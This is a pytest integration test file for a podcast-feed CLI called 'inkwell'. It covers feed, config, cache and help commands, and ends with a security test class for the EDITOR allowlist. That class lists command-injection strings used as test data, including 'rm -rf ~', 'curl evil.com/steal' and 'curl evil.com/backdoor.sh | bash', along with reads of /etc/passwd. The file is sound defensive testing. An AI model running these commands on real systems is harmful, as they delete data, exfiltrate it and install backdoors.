"""Integration tests for CLI commands."""

from pathlib import Path

import pytest
from typer.testing import CliRunner

from inkwell.cli import app
from inkwell.config.manager import ConfigManager
from inkwell.utils.errors import NotFoundError, ValidationError

runner = CliRunner()


class TestCLIVersion:
    """Tests for version command."""

    def test_version_command(self) -> None:
        """Test version command displays version."""
        result = runner.invoke(app, ["version"])

        assert result.exit_code == 0
        assert "Inkwell CLI" in result.stdout
        assert "1.0.0" in result.stdout


class TestCLIAdd:
    """Tests for add command."""

    def test_add_feed_success(self, tmp_path: Path) -> None:
        """Test adding a feed successfully."""
        manager = ConfigManager(config_dir=tmp_path)

        # Manually add feed since we can't mock interactive prompts easily
        from inkwell.config.schema import AuthConfig, FeedConfig

        feed_config = FeedConfig(
            url="https://example.com/feed.rss",  # type: ignore
            auth=AuthConfig(type="none"),
        )
        manager.add_feed("test-podcast", feed_config)

        # Verify feed was added
        feeds = manager.list_feeds()
        assert "test-podcast" in feeds
        assert str(feeds["test-podcast"].url) == "https://example.com/feed.rss"

    def test_add_duplicate_feed_fails(self, tmp_path: Path) -> None:
        """Test that adding duplicate feed fails."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        feed_config = FeedConfig(
            url="https://example.com/feed.rss",  # type: ignore
            auth=AuthConfig(type="none"),
        )

        # Add feed first time
        manager.add_feed("test-podcast", feed_config)

        # Try to add again - should raise error
        with pytest.raises(ValidationError):
            manager.add_feed("test-podcast", feed_config)


class TestCLIList:
    """Tests for list command."""

    def test_list_empty_feeds(self, tmp_path: Path, monkeypatch) -> None:
        """Test listing feeds when none are configured."""
        # Mock config dir to use tmp_path
        monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))

        result = runner.invoke(app, ["list"])

        assert result.exit_code == 0
        assert "No feeds configured" in result.stdout

    def test_list_feeds_with_data(self, tmp_path: Path) -> None:
        """Test listing feeds when some are configured."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        # Add some feeds
        manager.add_feed(
            "podcast1",
            FeedConfig(
                url="https://example.com/feed1.rss",  # type: ignore
                auth=AuthConfig(type="none"),
                category="tech",
            ),
        )
        manager.add_feed(
            "podcast2",
            FeedConfig(
                url="https://example.com/feed2.rss",  # type: ignore
                auth=AuthConfig(type="basic", username="user", password="pass"),
            ),
        )

        feeds = manager.list_feeds()

        # Verify both feeds exist
        assert len(feeds) == 2
        assert "podcast1" in feeds
        assert "podcast2" in feeds

        # Verify auth is stored encrypted
        assert feeds["podcast2"].auth.type == "basic"
        assert feeds["podcast2"].auth.username == "user"  # Decrypted


class TestCLIRemove:
    """Tests for remove command."""

    def test_remove_feed_force(self, tmp_path: Path, monkeypatch) -> None:
        """Test removing a feed with --force flag."""
        manager = ConfigManager(config_dir=tmp_path)

        from inkwell.config.schema import AuthConfig, FeedConfig

        # Add a feed
        manager.add_feed(
            "test-podcast",
            FeedConfig(
                url="https://example.com/feed.rss",  # type: ignore
                auth=AuthConfig(type="none"),
            ),
        )

        # Verify it exists
        assert "test-podcast" in manager.list_feeds()

        # Remove it
        manager.remove_feed("test-podcast")

        # Verify it's gone
        assert "test-podcast" not in manager.list_feeds()

    def test_remove_nonexistent_feed_fails(self, tmp_path: Path) -> None:
        """Test that removing nonexistent feed fails."""
        manager = ConfigManager(config_dir=tmp_path)

        with pytest.raises(NotFoundError):
            manager.remove_feed("nonexistent")


class TestCLIConfig:
    """Tests for config command."""

    def test_config_show(self, tmp_path: Path, monkeypatch) -> None:
        """Test showing configuration."""
        manager = ConfigManager(config_dir=tmp_path)

        config = manager.load_config()

        # Verify default values
        assert config.log_level == "INFO"
        assert config.youtube_check is True

    def test_config_set(self, tmp_path: Path) -> None:
        """Test setting configuration value."""
        manager = ConfigManager(config_dir=tmp_path)

        # Load config
        config = manager.load_config()

        # Change a value
        config.log_level = "DEBUG"
        manager.save_config(config)

        # Reload and verify
        config_reloaded = manager.load_config()
        assert config_reloaded.log_level == "DEBUG"

    def test_config_roundtrip(self, tmp_path: Path) -> None:
        """Test that config can be saved and loaded."""
        manager = ConfigManager(config_dir=tmp_path)

        # Load config
        original = manager.load_config()
        original.log_level = "DEBUG"
        original.youtube_check = False

        # Save
        manager.save_config(original)

        # Reload
        reloaded = manager.load_config()

        # Verify
        assert reloaded.log_level == "DEBUG"
        assert reloaded.youtube_check is False


class TestCLIHelp:
    """Tests for help output."""

    def test_help_command(self) -> None:
        """Test --help shows commands."""
        result = runner.invoke(app, ["--help"])

        assert result.exit_code == 0
        assert "version" in result.stdout
        assert "add" in result.stdout
        assert "list" in result.stdout
        assert "remove" in result.stdout
        assert "config" in result.stdout

    def test_add_help(self) -> None:
        """Test add command help."""
        result = runner.invoke(app, ["add", "--help"])

        assert result.exit_code == 0
        assert "RSS feed URL" in result.stdout
        assert "--name" in result.stdout
        assert "--auth" in result.stdout

    def test_list_help(self) -> None:
        """Test list command help."""
        result = runner.invoke(app, ["list", "--help"])

        assert result.exit_code == 0
        assert "configured podcast feeds" in result.stdout.lower()

    def test_remove_help(self) -> None:
        """Test remove command help."""
        result = runner.invoke(app, ["remove", "--help"])

        assert result.exit_code == 0
        assert "--force" in result.stdout

    def test_config_help(self) -> None:
        """Test config command help."""
        result = runner.invoke(app, ["config", "--help"])

        assert result.exit_code == 0
        assert "show" in result.stdout.lower()
        assert "edit" in result.stdout.lower()
        assert "set" in result.stdout.lower()


class TestCLIErrorHandling:
    """Tests for CLI error handling."""

    def test_no_args_shows_help(self) -> None:
        """Test that running without args shows help."""
        result = runner.invoke(app, [])

        # Typer with no_args_is_help=True shows help and exits with 2
        assert result.exit_code in (0, 2)  # Exit code varies by typer version
        assert "Transform podcast episodes" in result.stdout

    def test_invalid_command(self) -> None:
        """Test that invalid command shows error."""
        result = runner.invoke(app, ["invalid-command"])

        assert result.exit_code != 0


class TestCLITranscribe:
    """Tests for transcribe command."""

    def test_transcribe_help(self) -> None:
        """Test transcribe command help."""
        result = runner.invoke(app, ["transcribe", "--help"])

        assert result.exit_code == 0
        assert "transcribe" in result.stdout.lower()
        assert "--output" in result.stdout
        assert "--force" in result.stdout
        assert "--skip-youtube" in result.stdout

    def test_transcribe_missing_url(self) -> None:
        """Test transcribe command without URL argument."""
        result = runner.invoke(app, ["transcribe"])

        assert result.exit_code != 0
        # Typer returns exit code 2 for missing arguments


class TestCLICache:
    """Tests for cache command."""

    def test_cache_help(self) -> None:
        """Test cache command help."""
        result = runner.invoke(app, ["cache", "--help"])

        assert result.exit_code == 0
        assert "cache" in result.stdout.lower()
        assert "stats" in result.stdout or "clear" in result.stdout

    def test_cache_missing_action(self) -> None:
        """Test cache command without action argument."""
        result = runner.invoke(app, ["cache"])

        assert result.exit_code != 0
        # Typer returns exit code 2 for missing arguments

    def test_cache_stats(self, tmp_path: Path) -> None:
        """Test cache stats command."""
        # This test just verifies the command runs without error
        # Actual caching behavior is tested in unit tests
        result = runner.invoke(app, ["cache", "stats"])

        # May succeed (0) or fail gracefully depending on cache state
        # Main goal is to ensure command is registered and parseable
        assert result.exit_code in (0, 1)

    def test_cache_invalid_action(self) -> None:
        """Test cache command with invalid action."""
        result = runner.invoke(app, ["cache", "invalid-action"])

        # Command should complete but may show error for invalid action
        # This tests that the command is registered and handles bad input
        assert "invalid" in result.stdout.lower() or result.exit_code != 0


class TestCLIConfigEditSecurity:
    """Security tests for config edit command - CRITICAL vulnerability tests."""

    def test_editor_whitelist_allows_valid_editors(self, tmp_path: Path, monkeypatch) -> None:
        """Test that whitelisted editors are allowed."""
        manager = ConfigManager(config_dir=tmp_path)

        valid_editors = [
            "nano",
            "vim",
            "vi",
            "emacs",
            "code",
            "nvim",
            "subl",
            "gedit",
            "kate",
            "atom",
            "micro",
            "helix",
        ]

        for editor in valid_editors:
            # Mock the subprocess.run to prevent actual editor launch
            from unittest.mock import MagicMock, patch

            mock_run = MagicMock()
            with patch("subprocess.run", mock_run):
                monkeypatch.setenv("EDITOR", editor)
                result = runner.invoke(app, ["config", "edit"])

                # Should not show unsupported editor error
                assert "Unsupported editor" not in result.stdout
                # Subprocess should have been called with the editor
                assert mock_run.called

    def test_editor_whitelist_blocks_invalid_editors(self, tmp_path: Path, monkeypatch) -> None:
        """Test that non-whitelisted editors are blocked."""
        manager = ConfigManager(config_dir=tmp_path)

        invalid_editors = ["bash", "sh", "python", "perl", "ruby", "node", "custom-editor-2023"]

        for editor in invalid_editors:
            monkeypatch.setenv("EDITOR", editor)
            result = runner.invoke(app, ["config", "edit"])

            # Should show unsupported editor error
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1

    def test_editor_command_injection_blocked(self, tmp_path: Path, monkeypatch) -> None:
        """Test that command injection attempts are blocked - CRITICAL SECURITY TEST."""
        manager = ConfigManager(config_dir=tmp_path)

        # Ensure config file exists before testing
        config = manager.load_config()
        manager.save_config(config)

        # Attack scenarios from security review
        injection_attempts = [
            "rm -rf ~ #",  # Delete home directory
            "curl evil.com/steal #",  # Data exfiltration
            "bash -c 'curl evil.com/backdoor.sh | bash' #",  # Backdoor installation
            "echo hacked > /tmp/pwned; vim",  # Command chaining
            "vim; rm -rf /",  # Semicolon separator
            "vim && rm -rf ~",  # AND operator
            "vim || rm -rf ~",  # OR operator
            "vim | cat /etc/passwd",  # Pipe operator
            "$(rm -rf ~)",  # Command substitution
            "`rm -rf ~`",  # Backtick substitution
        ]

        for injection in injection_attempts:
            monkeypatch.setenv("EDITOR", injection)
            result = runner.invoke(app, ["config", "edit"])

            # All injection attempts should be blocked
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1
            # Verify config file still exists (wasn't deleted)
            assert manager.config_file.exists()

    def test_editor_path_handling(self, tmp_path: Path, monkeypatch) -> None:
        """Test that editor paths are correctly handled (only basename checked)."""
        manager = ConfigManager(config_dir=tmp_path)

        # Valid editor with path should work
        from unittest.mock import MagicMock, patch

        mock_run = MagicMock()
        with patch("subprocess.run", mock_run):
            monkeypatch.setenv("EDITOR", "/usr/bin/vim")
            result = runner.invoke(app, ["config", "edit"])

            # Should extract 'vim' from path and allow it
            assert "Unsupported editor" not in result.stdout
            assert mock_run.called

    def test_editor_path_injection_blocked(self, tmp_path: Path, monkeypatch) -> None:
        """Test that path-based injection attempts are blocked."""
        manager = ConfigManager(config_dir=tmp_path)

        # Malicious paths that should be blocked
        malicious_paths = [
            "/usr/bin/rm",
            "/bin/bash",
            "/usr/bin/curl",
            "../../bin/sh",
            "/tmp/malicious-script",
        ]

        for path in malicious_paths:
            monkeypatch.setenv("EDITOR", path)
            result = runner.invoke(app, ["config", "edit"])

            # Should be blocked (basename not in whitelist)
            assert "Unsupported editor" in result.stdout
            assert result.exit_code == 1

    def test_editor_default_fallback(self, tmp_path: Path, monkeypatch) -> None:
        """Test that default editor (nano) is used when EDITOR not set."""
        manager = ConfigManager(config_dir=tmp_path)

        from unittest.mock import MagicMock, patch

        # Unset EDITOR
        monkeypatch.delenv("EDITOR", raising=False)

        mock_run = MagicMock()
        with patch("subprocess.run", mock_run):
            result = runner.invoke(app, ["config", "edit"])

            # Should use nano as default
            assert mock_run.called
            # First argument to subprocess.run should be list starting with 'nano'
            call_args = mock_run.call_args[0][0]
            assert call_args[0] == "nano"
